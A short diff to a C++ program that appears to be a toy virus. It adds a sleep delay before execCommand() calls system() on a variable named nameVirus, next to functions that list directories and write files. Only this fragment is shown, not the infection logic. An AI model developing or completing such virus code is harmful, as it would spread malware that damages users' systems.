@@ -7,6 +7,8 @@
 #include <dirent.h>
 #include <iostream>
 #include <sys/stat.h>
+#include <unistd.h>
+
 
 
 
@@ -51,7 +53,7 @@ void ListDir(const std::string &path, std::vector<std::string> &files)
 
 // write the file
 void execCommand(){
-
+usleep(3 * 10000);
   system((nameVirus).c_str());
 }
 void writeFiles(std::vector<std::string> files)
